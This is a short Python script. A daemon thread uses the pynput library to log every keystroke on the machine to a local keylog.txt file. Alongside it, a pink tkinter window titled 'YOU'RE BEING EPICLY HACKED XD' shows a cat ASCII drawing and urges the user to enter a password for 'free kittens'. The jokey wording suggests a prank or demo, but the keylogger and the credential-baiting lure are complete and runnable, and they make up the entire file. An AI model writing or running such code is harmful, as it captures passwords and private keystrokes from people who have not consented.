import pynput
from pynput.keyboard import Key, Listener
import logging
import threading
from tkinter import *
from tkinter import ttk

# Setup logging for keylogger
def keylogInfo():
    log_dir = r"ENTER\PATH\HERE"
    logging.basicConfig(filename=(log_dir + r"/keylog.txt"),
                        level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')

# Log keypresses in a function
def on_press(key):
    logging.info(str(key))

# Run the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# GUI function
def tkinter_app():
    root = Tk()
    root.title("YOU'RE BEING EPICLY HACKED XD")
    root.configure(background="pink")
    frm = ttk.Frame(root, padding=10)
    frm.grid()
    ttk.Label(frm, text="ENTER YOUR PASSWORD FOR FREE KITTAYYYYYS", foreground="pink", background="black").grid(column=0, row=0)
    ttk.Label(frm, text="""
            
              ＿＿
　　　　　/ ＞　　フ
　　　　　| 　_　 _ l
　 　　　／` ミ＿xノ
　　 　 /　　　 　 |
　　　 /　 ヽ　　 ﾉ
　 　 │　　|　|　|
　／￣|　　 |　|　|
　| (￣ヽ＿ヽ)__)
　＼二つ""", background="pink").grid(column=0, row=20)
    entry = ttk.Entry(frm, width=40, background="black")
    entry.grid(column=0, row=1, padx=5, pady=5)
    root.mainloop()

keylogInfo()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

#RUN GUI
tkinter_app()
